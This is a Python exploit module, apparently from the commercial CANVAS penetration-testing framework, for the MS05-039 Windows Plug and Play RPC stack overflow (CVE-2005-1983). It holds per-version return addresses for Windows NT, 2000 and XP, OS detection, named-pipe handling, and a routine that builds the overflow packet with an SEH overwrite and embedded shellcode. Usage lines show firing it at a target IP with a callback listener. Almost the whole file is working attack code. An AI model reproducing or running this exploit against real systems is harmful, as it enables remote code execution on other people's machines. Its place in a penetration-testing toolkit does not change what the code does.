#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import struct

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from msrpcexploit import msrpcexploit
from libs.newsmb.libdcerpc import s_dce_win2k_unistring
import canvasengine

# GUI info
NAME='Microsoft Windows PnP RPC Overflow'
DESCRIPTION='Microsoft Windows PnP umpnpmgr.dll RPC Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='08/09/05'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS05-039.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['Note']='Windows XP needs a valid username and password'
DOCUMENTATION["CVE Name"] = "CVE-2005-1983"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1983"
DOCUMENTATION['CVSS'] = 10.0
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP']
PROPERTY['MSADV']='MS05-039'
CHANGELOG="""
KK 01/17/07:
Rewritten
"""

NOTES="""
Tested on:
Windows NT 4.0 Server SP6a French UP2DATE
Windows 2000 Server SP2 English OOTB
Windows 2000 Server SP3 English OOTB
Windows 2000 Server SP4 English OOTB
Windows 2000 Server SP0 Japanese OOTB
Windows 2000 Server SP4 Japanese OOTB
Windows 2000 Professional SP0 Simplified Chinese OOTB
Windows XP Professional SP0 English OOTB
Windows XP Professional SP1a French OOTB

Usage:
./exploits/ms05_039/ms05_039.py -v 0 -t 10.10.11.132 -l 10.10.11.1 -d 5555
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
"""

targets={
    0: ['Autoversioning','',0,0,0],     
    1: ['Windows NT 4.0 SP6a','0.0',0x26,40,0x78003eff], #call esi @ msvcrt.dll
    2: ['Windows 2000 SP0-SP4','1.0',0x35,36,0x187533], #jmp ebx
    3: ['Windows XP SP0-SP1a','1.0',0x36,16,0x1006fa8], #pop&pop&ret
}


class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name        = NAME
        self.port        = 139
        self.host        = ''
        self.version     = 0
        self.badstring   = '' #no bad chars
        self.UUID        = u'8d9f4e40-a03d-11ce-8f69-08003e30051b'
        self.namedpipe   = u'browser'
        self.autoversion = 1
        self.listenerArgsDict['fromcreatethread']=1
       
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
                                            
    def getArgs(self):
        self.host=self.target.interface
        self.namedpipe=self.argsDict.get('namedpipe',self.namedpipe)
        self.port=int(self.argsDict.get('port',self.port))
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)
        if self.version==0: #we don't want result of testOS to be overwritten
            self.version=int(self.argsDict.get('version',self.version))
        return

    def testOS(self):
        self.getArgs()
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        devlog('ms05_039','target=%s->%s'%(self.target,app.target))
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        os=app.result
        if os.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        if not os.language:
            self.log('No language found, defaulting to engine\'s non-language option %s'%self.engine.osdetect_mode)
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NO_RUN:
                self.log('Not running, could not find language')
                return 0
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_ONE_LANG:
                self.log('Assuming language %s'% self.engine.osdetect_lang)
                os.language=self.engine.osdetect_lang
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NEAREST_NEIGHBOR:
                self.log('Nearest neighbor algorithm not yet implemented')
                return 0
        if os.version=='NT':
            self.log('Attacking Windows NT 4.0 language: %s'%(os.language))
            self.version=1
            return 1
        elif os.version=='2000':
            self.log('Attacking Windows 2000 language: %s'%(os.language))
            self.version=2
            return 1
        elif os.version=='XP':
            self.log('Attacking Windows XP language: %s'%(os.language))
            self.version=3
            return 1
        else:
            self.log('OS not vulnerable: %s'%(result))
        return 0

    def buildConnectionList(self):
        self.getArgs()
        if targets[self.version][0].count('XP')!=0 or targets[self.version][0].count('2003')!=0:
            self.namedpipe=randomlist(['scerpc','ntsvcs'])
        self.log('Setting named pipe: %s'%(self.namedpipe))
        self.description,self.uuidversion,self.targetfunction,self.distance,self.eip=targets[self.version]
        self.connectionList=['ncacn_np:%s[\\%s]'%(self.host,self.namedpipe)]
        self.log('Using \'%s\':\'%s\' as credentials'%(self.user,self.password))
        return self.connectionList

    def buildDcePacket(self):
        payload=''
        payload+='A'*self.distance
        payload+='\xeb\x1e' #jmp forward
        payload+='BB'
        payload+=struct.pack('<L',self.eip) #SEH
        payload+='C'*0x14
        payload+='DDD\xff' #access violation
        payload+=self.shellcode
        while (len(payload)%4)!=0:
            payload+='E'
        data=''
        data+=struct.pack('<LLLL',0,0,len(payload),0)
        data+='F'*0x10
        data+=payload
        packet=''
        packet+=s_dce_win2k_unistring('X\\Y\\Z')
        packet+=struct.pack('<LL',0xffff,len(data))
        packet+=data
        packet+=struct.pack('<LLL',len(data),4,0)
        return packet

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
